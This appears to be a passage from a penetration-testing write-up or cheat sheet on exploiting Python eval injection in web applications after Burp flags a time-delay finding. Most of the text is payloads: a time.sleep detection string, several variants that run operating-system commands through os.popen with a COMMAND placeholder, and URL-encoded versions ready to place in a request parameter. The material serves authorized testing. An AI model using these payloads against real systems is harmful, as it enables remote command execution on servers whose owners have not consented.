

When Burp detects:
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))



eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))



And as it turns out, you don't even need the for loop. You can use the global __import__ function:

eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))

Better yet, now that we have import and popen as one expression, in most cases, you don't even need to use compile at all:

__import__('os').popen('COMMAND').read()

To pass these to the web application, you will have to URL encode some characters. The examples from above are each encoded below to illustrate what they might look like in action:

param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
